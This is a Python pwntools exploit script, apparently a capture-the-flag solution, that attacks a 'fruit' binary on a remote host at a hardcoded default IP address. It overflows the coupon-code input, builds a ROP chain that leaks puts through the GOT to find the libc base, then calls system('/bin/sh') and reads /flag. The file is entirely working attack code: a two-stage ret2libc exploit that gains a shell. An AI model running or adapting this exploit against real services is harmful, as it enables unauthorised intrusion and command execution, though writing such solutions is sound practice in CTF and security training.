from __future__ import annotations

import os
import sys
from pathlib import Path

from pwn import ELF, ROP, context, log, p64, remote, u64


HOST = os.environ.get("CTF_TARGET_HOST", "183.238.63.200")
PORT_TEXT = os.environ.get("CTF_TARGET_PORT", "45711")
BINARY_TEXT = os.environ.get("CTF_FRUIT_BINARY", "")

if not BINARY_TEXT:
    raise SystemExit("Set CTF_FRUIT_BINARY to the supplied fruit ELF.")

PORT = int(PORT_TEXT)
BINARY = Path(BINARY_TEXT).resolve()
OFFSET = 24
MAIN_ADDR = 0x40174A

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

elf = ELF(str(BINARY), checksec=False)
context.binary = elf

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address


def enter_coupon() -> None:
    io.sendlineafter(b"[*] Enter your choice:", b"3")
    io.sendlineafter(b"[*] Enter your pay way:", b"4")
    io.recvuntil(b"[*] Enter coupon code:")


io = remote(HOST, PORT, timeout=10)

enter_coupon()
payload = b"2024" + b"A" * 20
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(MAIN_ADDR)
io.sendline(payload)

io.recvuntil(b"[+] OK~\n\n")
puts_leak = u64(io.recvline(drop=True).ljust(8, b"\x00"))

log.success(f"puts leak = {hex(puts_leak)}")

puts_offset = int(os.environ.get("CTF_PUTS_OFFSET", "0x84420"), 16)
system_offset = int(os.environ.get("CTF_SYSTEM_OFFSET", "0x52290"), 16)
binsh_offset = int(os.environ.get("CTF_BINSH_OFFSET", "0x1b45bd"), 16)

libc_base = puts_leak - puts_offset
if libc_base & 0xFFF:
    raise SystemExit(f"unaligned libc base: {hex(libc_base)}")

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

io.recvuntil(b"[*] Enter your choice:")
io.sendline(b"3")
io.sendlineafter(b"[*] Enter your pay way:", b"4")
io.recvuntil(b"[*] Enter coupon code:")

stage_two = b"2024" + b"A" * 20
stage_two += p64(ret)
stage_two += p64(pop_rdi)
stage_two += p64(binsh_addr)
stage_two += p64(system_addr)
io.sendline(stage_two)

io.recvuntil(b"[+] OK~\n", timeout=5)
io.sendline(b"cat /flag")
io.sendline(b"echo __CASE_DONE__")

try:
    result = io.recvuntil(b"__CASE_DONE__", timeout=5)
except Exception as exc:
    io.close()
    raise SystemExit(f"shell interaction failed: {exc}") from exc

sys.stdout.write(result.decode("latin-1", errors="replace"))
io.sendline(b"exit")
io.close()
